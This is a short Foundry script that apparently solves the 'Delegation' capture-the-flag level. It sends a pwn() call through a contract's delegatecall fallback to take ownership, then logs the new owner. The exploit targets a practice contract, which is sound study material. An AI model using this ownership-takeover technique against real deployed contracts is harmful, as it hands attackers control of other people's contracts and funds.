// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Delegation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract DelegationSolution is Script {

    address target = 0x6823671137435D130F4E73A468C2c4c083Bb9092;
    Delegation public delegation = Delegation(target);

    function run() external {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address(delegation).call(abi.encodeWithSignature("pwn()"));
        console.log("owner: ", delegation.owner());
        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}